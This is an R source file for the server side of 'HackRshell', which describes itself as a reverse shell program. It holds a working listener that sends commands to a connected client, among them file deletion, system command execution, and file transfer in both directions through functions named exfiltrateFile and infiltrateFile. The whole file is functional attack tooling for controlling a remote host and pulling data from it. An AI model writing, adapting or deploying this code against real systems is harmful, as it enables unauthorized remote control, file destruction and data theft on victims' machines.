    # HackRshell, an R reverse shell program - server side function.
    # Copyright (C) 2022 Ian Roberts

    # This library is free software; you can redistribute it and/or
    # modify it under the terms of the GNU Lesser General Public
    # License as published by the Free Software Foundation; either
    # version 2.1 of the License, or (at your option) any later version.

    # This library is distributed in the hope that it will be useful,
    # but WITHOUT ANY WARRANTY; without even the implied warranty of
    # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
    # Lesser General Public License for more details.

    # You should have received a copy of the GNU Lesser General Public
    # License along with this library; if not, write to the Free Software
    # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA



#Helper function, closes without a warning message if connection is
#null, which is initially is.
safeClose<- function(con) {
  if (!is.null(con)) {close(con)}
}


#"download [filename]"
#WARNING: this function reads from the main socket
#WARNING: this function attempts to open a second connection on secondaryPort
exfiltrateFile <- function(socket, host, secondaryPort, command) {
  abortDownload <- FALSE
  fileSize <- as.integer(readLines(socket, 1))
  fileName <- substring(command, 10)
  fileSocket <- NULL
  fileData <- tryCatch({
    if (is.na(fileSize) || fileSize < 0) {
      signalCondition(simpleError("Download Aborted by Client"))
    }
    fileSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=TRUE, timeout=300, open="rb")
    readBin(fileSocket, "raw", n=fileSize)
  }, error=function(e){
    abortDownload <<- TRUE
    print(paste("Server error receiving file data: ", e$message))
  }, finally=function() {
    safeClose(fileSocket)
  })
  if (!abortDownload) {
    outFile <- NULL
    tryCatch({
      outFile = file(fileName, "wb")
      writeBin(as.raw(fileData), outFile, size=1)
      print(paste("Downloaded ", fileSize, "bytes"))
    }, error=function(e){
      print(paste("Error writing received data: ", e$message))
    }, finally=function() {
      safeClose(outFile)
    })
  }
}

#"upload [filename]"
#WARNING: this function writes to the main socket
#WARNING: this function attempts to open a second connection on secondaryPort
infiltrateFile <- function(socket, host, secondaryPort, command) {
  fileName <- substring(command, 8)
  abortUpload <- FALSE
  fileSize <- 0
  targetFile <- NULL
  fileData <- tryCatch({
    if (!file.exists(fileName)) {
      signalCondition(simpleError("File not found"))
    }
    fileInfo <- file.info(fileName, extra_cols=FALSE)
    fileSize <- as.integer(fileInfo$size)
    #Slight overestimate to compensate for floating point rounding error.
    #File size is saved as a float in file.info.
    if (fileInfo$isdir) {
      signalCondition(simpleError("That is a directory, this command can only upload files."))
    }
    if (fileSize*1.01 >= 2^31) {
      signalCondition(simpleError("File too large to send"))
    }
    targetFile <- file(fileName, "rb")
    readBin(targetFile, what="raw", n=(fileSize*1.01))
  }, error=function(e){
    print(paste("Error loading file: ", e$message))
    writeLines("-1", socket)
    abortUpload <<- TRUE
  }, finally=function(){
    safeClose(targetFile)
  })
  uploadSocket <- NULL
  if(!abortUpload) {
    writeLines(toString(fileSize), socket)
    tryCatch({
      uploadSocket <- socketConnection(host=host, port=secondaryPort, blocking=FALSE, server=TRUE, timeout=300, open="wb")
      writeBin(fileData, uploadSocket, size=1)
      print(paste("Sent", fileSize, "bytes!"))
    }, error=function(e){
      print(paste("Error uploading file to client: ", e$message))
    }, finally=function(){
      safeClose(uploadSocket)
    })
  } else {
    print("Upload aborted")
  }
}

#"help"
#Note that this only executes on the server side
printHelpMessage <- function(validCommands) {
  print("List of Commands: ", quote=FALSE)
  sortedCommands <- sort(validCommands)
  for (i in 1:length(sortedCommands)) {
    print(sortedCommands[i], quote=FALSE)
  }
}

server <- function(host="localhost", port=4471, secondaryPort=5472) {
  validCommands <- c("help", "pwd", "dir", "ls", "cd", "rm", "del",
                      "cat", "type", "download", "upload", "sys", "exit")
  socket <- socketConnection(host=host, port=port, blocking=TRUE, server=TRUE, encoding="utf-8", timeout=300, open="r+")
  #Ensures the sockets get closed
  on.exit(tryCatch(close(socket), error=function(e){}, warning=function(w){}))
  fromClient <- readLines(socket, 1)
  exiting <- FALSE
  cat(fromClient)
  while(!exiting) {
    command <- readline(prompt="Shell> ")

    if (command != "") {
      firstWord <- strsplit(command, " ", fixed=TRUE)[[1]][1]
      if(!is.element(firstWord, validCommands)) {
        print(paste("Command", firstWord, "not recognized"))
      }
      else if (firstWord == "help") {
        printHelpMessage(validCommands)
      }
      else {
        writeLines(command, socket)
        if (firstWord == "exit") {
          exiting <- TRUE
        }
        else if (firstWord == "download") {
          exfiltrateFile(socket, host, secondaryPort, command)
        }
        else if (firstWord == "upload") {
          infiltrateFile(socket, host, secondaryPort, command)
        }
        if (!exiting) {
          fromClient <- readLines(socket, 1)
          fromClient <- gsub("%&%", "\n", fixed=TRUE, fromClient)
          cat(fromClient)
        }
      }

    }


  }
  close(socket)
  print("Socket closed")
}